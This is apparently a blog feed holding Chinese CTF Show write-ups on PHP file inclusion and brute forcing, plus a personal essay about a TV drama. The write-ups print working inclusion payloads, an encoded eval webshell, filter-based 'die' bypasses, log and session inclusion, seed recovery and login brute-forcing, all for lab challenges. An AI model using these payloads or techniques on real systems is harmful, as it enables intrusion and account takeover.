PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz5h 解码是 &lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt;a</span></span><br></pre></td></tr></table></figure><h2 id="1-8-Web-117-—-convert-iconv-死亡绕过"><a href="#1-8-Web-117-—-convert-iconv-死亡绕过" class="headerlink" title="1.8 Web 117 — convert.iconv.* + 死亡绕过"></a>1.8 Web 117 — convert.iconv.* + 死亡绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];filter(<span class="variable">$file</span>);file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>); </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤掉了我们常使用的过滤器，我们可以使用别的 例如：convert.iconv.*</span></span><br></pre></td></tr></table></figure><p>它的编码解码与函数 <code>iconv()</code> 一致</p><p><img src="https://i.loli.net/2021/10/01/JobfmHWAMNvRi5Z.png" alt="image-20210720120252523"></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109319686">https://blog.csdn.net/qq_44657899/article/details/109319686</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">echo</span> iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;</span>); <span class="comment"># ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php# postcontents=?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/XSdDRwM7zJa14WV.png" alt="image-20210720121650119"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># postab=system(&#x27;cat flag.php&#x27;);</span></span><br></pre></td></tr></table></figure><h2 id="1-9-Web-116-—"><a href="#1-9-Web-116-—" class="headerlink" title="1.9 Web 116 —"></a>1.9 Web 116 —</h2><p>misc+lfi</p><p>将视频 在 Kali 下进行 binwalk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e 1.pngbinbalk -D=png 1.mp4<span class="comment"># 获取图片</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/CKV7dYLy4lP6eBu.png" alt="image-20210802153007262"></p><p><img src="https://i.loli.net/2021/08/02/mHgrCUQj6vVKt4e.png" alt="image-20210802153516688"></p><p>然后直接 <code>?file=php://filter/resource=flag.php</code> 即可 ，但需要查看源码，页面上查看不了，我们可以抓包查看</p><h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><p>文件包含 include() 函数</p><p><strong>读文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php?file=data://text/plain,&lt;?php system(<span class="string">&#x27;cat flag.php&#x27;</span>); ?&gt;<span class="comment">#查看源代码?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=#PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=内容是&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;?file=php://inputpost:&lt;?phpsystem(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure><p><strong>写文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php?contents=?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤 php data :  Web 80-81# 日志包含?file=/var/log/nginx/access.log  # 发送包时写入 代码# 过滤 .   Web 82-86# SESSION 包含 条件竞争&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://708cd0ba-4c4a-40c7-b53c-0dca6ac256fe.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# &lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;死亡绕过  Web 87?filename=php://filter/write=convert.base64-decode/resource=1.php?content=aaPD9waHAgc3lzdGVtKCdscycpOyA/Pg==# &lt;?php system(&#x27;ls&#x27;); ?&gt;# 过滤 + = 限制 base64Web 88# 拼凑 php 语句?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PmFi# PD9waHAgc3lzdGVtKCdscycpOyA/PmFi 解码是 &lt;?php system(&#x27;ls&#x27;); ?&gt;ab</span></span><br></pre></td></tr></table></figure><p>参考</p><p><a href="https://blog.csdn.net/weixin_45882317/article/details/114576726">https://blog.csdn.net/weixin_45882317/article/details/114576726</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF Show 文件包含篇。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-爆破</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-%E7%88%86%E7%A0%B4/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-%E7%88%86%E7%A0%B4/</id>
    <published>2021-10-01T11:10:35.000Z</published>
    <updated>2021-10-07T10:15:09.899Z</updated>
    
    <content type="html"><![CDATA[<p>CTF show 爆破篇。</p><span id="more"></span><h1 id="一、CTF-show-—-爆破"><a href="#一、CTF-show-—-爆破" class="headerlink" title="一、CTF show — 爆破"></a>一、CTF show — 爆破</h1><h2 id="1-1-Web-21-—-Burp-爆破-—-base64-encode"><a href="#1-1-Web-21-—-Burp-爆破-—-base64-encode" class="headerlink" title="1.1 Web 21 — Burp 爆破 — base64-encode"></a>1.1 Web 21 — Burp 爆破 — base64-encode</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">爆破什么的，都是基操</span><br></pre></td></tr></table></figure><p><strong>抓包查看</strong>：输入的账号密码都被base64加密了，并且中间还有一个 <code>:</code> 分割</p><p>Burp 抓包，下载题目给的字典，进行爆破：手动更改 <code>admin:</code> base64 加密之后的内容，只将密码部分设为变量，加载题目字典，设置 base64-encode 加密，<strong>去掉勾选 URL编码</strong>，开始攻击。</p><p><img src="https://i.loli.net/2021/07/14/MTD1Bp7G5F2tAiU.png" alt="image-20210714212830673"></p><p><img src="https://i.loli.net/2021/07/14/bxHg23aGJ7BWPe6.png" alt="image-20210714212813152"></p><h2 id="1-2-Web-22-—-子域名爆破-—-subDomainBrute-工具"><a href="#1-2-Web-22-—-子域名爆破-—-subDomainBrute-工具" class="headerlink" title="1.2 Web 22 — 子域名爆破 — subDomainBrute 工具"></a>1.2 Web 22 — 子域名爆破 — subDomainBrute 工具</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域名也可以爆破的，试试爆破这个ctf.show的子域名</span><br></pre></td></tr></table></figure><p><strong>subDomainBrute 工具子域名爆破</strong></p><p><img src="https://i.loli.net/2021/07/15/24RTe3VNyP5ujhU.png" alt="image-20210715113857094"></p><p>访问 <code>http://flag.ctfer.com/index.php</code></p><h2 id="1-3-Web-23-—-根据代码要求写脚本"><a href="#1-3-Web-23-—-根据代码要求写脚本" class="headerlink" title="1.3 Web 23 — 根据代码要求写脚本"></a>1.3 Web 23 — 根据代码要求写脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还爆破？这么多代码，告辞！</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$token</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intval(<span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ]) 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 <span class="keyword">var</span> 的 <span class="keyword">integer</span> 数值</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>脚本：如果是 二位数</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;36;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=0;<span class="variable">$j</span>&lt;36;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];    </span><br><span class="line">        <span class="variable">$token</span> = md5(<span class="variable">$token</span>); </span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, 1,1)===substr(<span class="variable">$token</span>, 14,1) &amp;&amp; substr(<span class="variable">$token</span>, 14,1) ===substr(<span class="variable">$token</span>, 17,1))&#123; </span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, 1,1))+intval(substr(<span class="variable">$token</span>, 14,1))+substr(<span class="variable">$token</span>, 17,1))/substr(<span class="variable">$token</span>, 1,1)===intval(substr(<span class="variable">$token</span>, 31,1)))&#123; </span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="built_in">exit</span>(0);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br><span class="line"><span class="comment"># 得到 3j</span></span><br></pre></td></tr></table></figure><p><strong>脚本：如果是 三位数</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"><span class="built_in">print</span> (strlen(<span class="variable">$string</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = 0; <span class="variable">$a</span> &lt; 62; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$b</span> = 0; <span class="variable">$b</span> &lt; 62; <span class="variable">$b</span>++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$c</span> = 0; <span class="variable">$c</span> &lt; 62; <span class="variable">$c</span>++) &#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="variable">$string</span>[<span class="variable">$a</span>] . <span class="variable">$string</span>[<span class="variable">$b</span>] . <span class="variable">$string</span>[<span class="variable">$c</span>];</span><br><span class="line">            <span class="variable">$token</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line">            <span class="keyword">if</span>(substr(<span class="variable">$token</span>, 1,1)===substr(<span class="variable">$token</span>, 14,1) &amp;&amp; substr(<span class="variable">$token</span>, 14,1) ===substr(<span class="variable">$token</span>, 17,1))&#123; </span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, 1,1))+intval(substr(<span class="variable">$token</span>, 14,1))+substr(<span class="variable">$token</span>, 17,1))/substr(<span class="variable">$token</span>, 1,1)===intval(substr(<span class="variable">$token</span>, 31,1)))&#123; </span><br><span class="line">                    <span class="built_in">echo</span> <span class="variable">$flag</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 得到 62 aDp a6e b7l ejt hc2 jGd ktD o07 pjd ubv vMJ v8O wuB wyG xjF AKh DCj D36 GT7 H3D Jik JKh KtR K2e LfJ Lqj Nzc Oie OiU R7V ScB SSM SVi UYg WwF 1zg 4cQ 422 6xU 6Vh 7vE</span></span><br></pre></td></tr></table></figure><h2 id="1-4-Web-24-—-php-伪随机数-—-mt-srand"><a href="#1-4-Web-24-—-php-伪随机数-—-mt-srand" class="headerlink" title="1.4 Web 24 — php 伪随机数 — mt_srand()"></a>1.4 Web 24 — php 伪随机数 — mt_srand()</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(372619038);</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$r</span>)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    <span class="built_in">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpmt_srand(372619038);<span class="built_in">echo</span>(mt_rand());?&gt;<span class="comment"># 得到 1155388967</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>伪随机数漏洞：当种子不变时，实际上生成的随机数是固定的。</strong></p></blockquote><p><img src="https://i.loli.net/2021/08/03/41LYMjzASdVfFUW.png" alt="image-20210803191659621"></p><p><img src="https://i.loli.net/2021/08/03/Jh12MBwLlyzgCNH.png" alt="image-20210803191723585"></p><h2 id="1-5-Web-25-—-php-伪随机数-逆推种子-—-php-mt-seed-工具使用"><a href="#1-5-Web-25-—-php-伪随机数-逆推种子-—-php-mt-seed-工具使用" class="headerlink" title="1.5 Web 25 — php 伪随机数 逆推种子 — php_mt_seed 工具使用"></a>1.5 Web 25 — php 伪随机数 逆推种子 — php_mt_seed 工具使用</h2><p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p><p>知道种子，可以确定你输出伪随机数的序列</p><p>知道随机数序列，倒过来也可以确定你的种子，如何确定？</p><p>工具 php_mt_seed</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);include(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), 0,8)));    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;            <span class="built_in">echo</span> <span class="variable">$flag</span>;        &#125;    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">echo</span> <span class="variable">$rand</span>;    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);    <span class="built_in">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdec() 函数把十六进制转换为十进制。mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), 0,8)));<span class="comment">#确定 种子$rand = intval($r)-intval(mt_rand());#得到随机数，与传入的 ?r 有关如果该随机数不存在，则输出 $rand如果该随机数存在，并且 $_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()) 则输出 $flag**代码分析**</span></span><br></pre></td></tr></table></figure><ul><li>那么生成的随机数，也就是与传入的 r 有关，而 r 我们可控</li><li>通过生成的随机数进行逆推可以得到种子，<a href="https://www.openwall.com/php_mt_seed/">工具 php_mt_seed</a></li></ul><p>还要注意的是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到 <span class="variable">$flag</span> 的条件：1. !<span class="variable">$rand</span> 即 <span class="variable">$rand</span> 不存在2. <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()) 也就是说，我们得计算出 token 的值，然后发包的时候要进行修改</span><br></pre></td></tr></table></figure><p>如何确保 <code>$rand 不存在</code> ？</p><p>测试</p><p><img src="https://i.loli.net/2021/08/04/AwBydsMHNcEvTaf.png" alt="image-20210804104524845"></p><p>当我们设置了种子之后 <code>mt_srand</code> ，我们只要传 同样的 r ，那么最终得到的 $rand 都是一样的，那么反过来，如果 我们传入 <code>?r=522258682</code> ，那最终就可以得到 $rand = 0</p><p><img src="https://i.loli.net/2021/08/04/cxFHsZhzS9WkE7i.png" alt="image-20210804104657248"></p><p>那现在我们就得要计算 <code>(mt_rand()+mt_rand())</code> 了</p><p>要计算生成的随机数之和，首先得先确定种子才行啊</p><p>使用工具 php_mt_seed</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/otukijoe/php_mt_seed.git</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/s7z4fFxmrRypnAv.png" alt="image-20210804105157149"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maketime ./php_mt_seed 1446899118</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/oGrb6JHqlOXT7VW.png" alt="image-20210804105726200"></p><p>通过抓包可以知道 该 php 版本是 PHP/7.3.11</p><p>计算 token 值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>highlight_file(<span class="keyword">__FILE__</span>);mt_srand(<span class="number">1048340704</span>);<span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;<span class="keyword">echo</span> mt_rand()+mt_rand().<span class="string">&quot;\n&quot;</span>;<span class="comment">//1446899118 219330488<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>抓包改值</p><p><img src="https://i.loli.net/2021/08/04/W1RHU2xBnvaPcCy.png" alt="image-20210804110911859"></p><h2 id="1-6-Web-26"><a href="#1-6-Web-26" class="headerlink" title="1.6 Web 26"></a>1.6 Web 26</h2><p><img src="https://i.loli.net/2021/08/04/EMhK6QNp3OcSnyA.png" alt="image-20210804111036383"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p> 查看源码</p><p><img src="https://i.loli.net/2021/08/04/jWUtw3qxuB1pd2s.png" alt="image-20210804111200056"></p><p><img src="https://i.loli.net/2021/08/04/x18GrqLFoT5PRV7.png" alt="image-20210804111426026"></p><h2 id="1-7-Web-27-—-身份证爆破"><a href="#1-7-Web-27-—-身份证爆破" class="headerlink" title="1.7 Web 27 — 身份证爆破"></a>1.7 Web 27 — 身份证爆破</h2><p><img src="https://i.loli.net/2021/08/04/o42RDNuHFIJBS8Y.png" alt="image-20210804112204280"></p><p> <img src="https://i.loli.net/2021/08/04/piUhumyn5bV4aEq.png" alt="image-20210804111755165"></p><p><img src="https://i.loli.net/2021/08/04/TVUe3r1Y2vjW5ER.png" alt="image-20210804111806858"></p><p>我们需要爆破出 学生的出生日期</p><p>Burp</p><p>上面可以看到该平台是 1999-2017 年的，那么作为大学生此时应该十八九岁，所以他们应该是1980 年之后的基本上</p><p>那么我们就从 1980 年开始设置 date 字典</p><p><img src="https://i.loli.net/2021/08/04/c15B8xbASmQryaW.png" alt="image-20210804113135627"></p><p>然后成功查询，得到  <strong>恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">621022199002015237  02015237</span><br></pre></td></tr></table></figure><p>最后成功登录即可</p><h2 id="1-8-Web-28"><a href="#1-8-Web-28" class="headerlink" title="1.8 Web 28"></a>1.8 Web 28</h2><p><img src="https://i.loli.net/2021/08/04/lCz96ZbM1hA7tKR.png" alt="image-20210804114109990"></p><p>Url 当中的 <code>/0/1/</code> 尝试爆破，即可得到</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF show 爆破篇。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>恶之花有感</title>
    <link href="https://xizhi-future.github.io/2021/10/01/%E6%81%B6%E4%B9%8B%E8%8A%B1%E6%9C%89%E6%84%9F/"/>
    <id>https://xizhi-future.github.io/2021/10/01/%E6%81%B6%E4%B9%8B%E8%8A%B1%E6%9C%89%E6%84%9F/</id>
    <published>2021-10-01T10:17:46.000Z</published>
    <updated>2021-10-01T11:44:54.831Z</updated>
    
    <content type="html"><![CDATA[<p>如果你的至亲犯了罪，杀了人，在你童年一无所知的时候，对你造成了难以想象的伤害，你该如何活下去？<br>你能相信一个人这一辈子只为一个人而活着吗？每天就仅仅是做着相同的事情，他是一个合格的丈夫，合格的父亲，可他的过去是自己可以选择的吗？<br>如果曝光，世人会怎末说，连环杀人犯的儿子，和自己的父亲一起计划杀人，在杀了对自己有养育之恩的人之后逃跑，18年里仍未捕获，随后假冒别人的身份，居然与一位刑警结婚、生子，过着普通人般平凡的生活。<br>耳朵听到的，电视新闻上看到的，一定是真正的吗？<br>谁会知道，他也是在年幼时偶然间从电视上才得知，自己是杀人犯的儿子呢，谁有会知道，18年来逃跑的他，竟然是在替自己的姐姐洗清罪名呢？谁又相信他只是想普普通通和自己爱的人一辈子平平淡淡的生活下去呢？<br>不会，世人不会，警察不会，他只是想要为她而活，而她，竟然在痛苦之中得知了所有的真相却要不得不以着警察的身份，对他戴上手铐。<br>他没有做错啊，他年少受欺受辱，却从未杀人，他具有人格障碍，不与任何人亲近，他总是为了一盘录音磁带与别人大打出手，那是因为那个磁带，是他母亲留给他的唯一遗物啊，他总是一个人，在安静的地方插上耳机听着，他的脸色会洋溢起少有的笑容，那是因为，他在听自己妈妈的声音啊。可谁知道，那声音，却是无比凄惨，谁听了都会知道，那仿佛是要离开这个世界的最后的哭泣。<br>他不知道爱是什么，不知道愤怒是什么，喜悦是什么，伤心是什么，他不知道人们的所有情绪的表现都是怎样的，他总是一副毫无表情的脸，不会哭，不会笑。<br>他本毫无目的的生活，忍受世人的恶语，而很幸运，他，遇见了，她。<br>她，比一般的女孩子都主动，她很可爱，很漂亮，她主动向他表白，对他说，她会好好爱他，每天都会多一点。她，不知道他是谁。<br>他们，有了，宝宝。<br>他为了她们去学习幸福时脸上会洋溢着的表情，他每天早起，做饭，接送孩子上学，在这个家里，他做的很好，可在世人眼里，他是个罪人。<br>他不懂爱是什么，可他却早已深深地爱着她。<br>她，得知了真相，她很痛苦，难以承受，她终于对他说出了，我们分开吧，我现在很讨厌你，我们分开吧。<br>他不知道为什么，他很难过，却不清楚自己是什么情绪，他不清楚自己对她的感情，不知道他们之间出了什么问题。他想啊想，想啊想，到底什么可以让她开心呢？于是他决定，帮助她，冒着生命危险，找到真凶。</p><p>即使不愿成为太阳，却依然绚烂夺目。</p>]]></content>
    
    
      
      
